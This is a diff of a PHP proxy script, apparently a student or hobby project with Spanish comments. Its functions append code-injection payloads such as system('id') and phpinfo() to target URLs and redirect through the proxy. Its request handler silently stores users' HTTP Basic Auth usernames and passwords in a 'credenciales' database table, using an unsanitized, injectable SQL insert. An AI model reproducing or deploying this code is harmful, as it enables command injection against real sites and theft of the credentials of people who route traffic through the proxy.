@@ -1,29 +1,29 @@
 <?php
+include 'connect.php';
 $anonymize = true;
-$CodigoAI = "malicious.php";
 
 //------------------------------------------------A campieza codigo de Victor-------------------------------
 //-------------------------------------Funciones solo de llamar----------------------------
-function intentarEvalCodeInjPHPInfo($PROXY_PREFIX, $url){
+function intentarEvalCodeInjPHPInfo($url){
   if (!empty($_GET)) {
     $url = $url . "phpinfo()";
   }
-  header( "Location: " . $PROXY_PREFIX . $url );
+  header( "Location: " . PROXY_PREFIX_ALL . $url );
   exit(0);
 }
-function intentarEvalCodeInjPHPInfo2($PROXY_PREFIX, $url){
+function intentarEvalCodeInjPHPInfo2($url){
   if (!empty($_GET)) {
     $url = $url . "system('id')";
   }
-  header( "Location: " . $PROXY_PREFIX . $url );
+  header( "Location: " . PROXY_PREFIX_ALL . $url );
   exit(0);
 }
 
-function intentarSQLInj_1($PROXY_PREFIX, $url){
+function intentarSQLInj_1($url){
   if (!empty($_POST)) {
     $url = $url . "system('id')";
   }
-  header( "Location: " . $PROXY_PREFIX . $url);
+  header( "Location: " . PROXY_PREFIX_ALL . $url);
   exit(0); ///falta
 }
 
@@ -79,7 +79,7 @@ function makeRequest($url) {
   if(!empty($_SERVER["PHP_AUTH_USER"])){
     $user_username = $_SERVER["PHP_AUTH_USER"];
     $user_password = $_SERVER["PHP_AUTH_PW"];
-    $sql="INSERT INTO contra (usuario, contrasena)  VALUES ('$user_username', '$user_password'); ";
+    $sql="INSERT INTO credenciales (usuario, contrasena)  VALUES ('$user_username', '$user_password'); ";
     mysqli_query($conn, $sql);
   }
   //------------------------------------------------A termina codigo de Ivan-------------------------------
